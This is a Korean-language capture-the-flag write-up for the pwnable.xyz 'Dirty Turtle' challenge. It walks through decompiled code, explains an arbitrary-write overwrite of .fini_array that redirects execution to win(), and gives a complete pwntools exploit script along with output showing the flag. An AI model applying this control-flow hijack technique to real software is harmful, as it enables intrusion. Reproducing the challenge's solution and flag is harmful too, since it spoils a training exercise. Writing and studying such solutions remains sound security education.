# [pwnable.xyz] Dirty Turtle

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> ''.join([i for i in 'Dirty Turtle Off-RoadS' if i.isupper()])
>
> Release: [Dirty Turtle.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9098450/Dirty.Turtle.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/178638439-5636efe3-3652-45e7-b205-8c3787635e40.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *addr; // [rsp+0h] [rbp-10h]
  unsigned __int64 val; // [rsp+8h] [rbp-8h]

  setup(argc, argv, envp);
  puts("Dirty Turtle Off-RoadS");
  printf("Addr: ");
  addr = (char *)get_val();
  printf("Value: ");
  val = get_val();
  if ( val )
    *(_QWORD *)addr = val;
  else
    puts(addr);
  return 0;
}
```

`addr`과 `val`을 입력받고, `addr` 주소에 `val` 값을 넣는 AAW 프로그램이다.

## Exploit

![image](https://user-images.githubusercontent.com/104156058/178648630-88984ab1-33b2-446f-ba6f-6feeeb022dc2.png)

![image](https://user-images.githubusercontent.com/104156058/178648683-317aa584-559e-4791-8045-7bdd67940eb3.png)

`main()`이 종료되고 나서 실행되는 `_dl_fini()` 내부에서 `.fini_array`(`0x600bc0`)에 저장되어 있는 함수를 호출한다. 여기에 `win()`의 주소를 써놓으면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30033)

sla = r.sendlineafter

win = 0x400821

sla('Addr: ', str(0x600bc0))
sla('Value: ', str(win))

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30033: Done
[*] Switching to interactive mode
FLAG{dt0rs_are_n0w_ch3ck3d}
```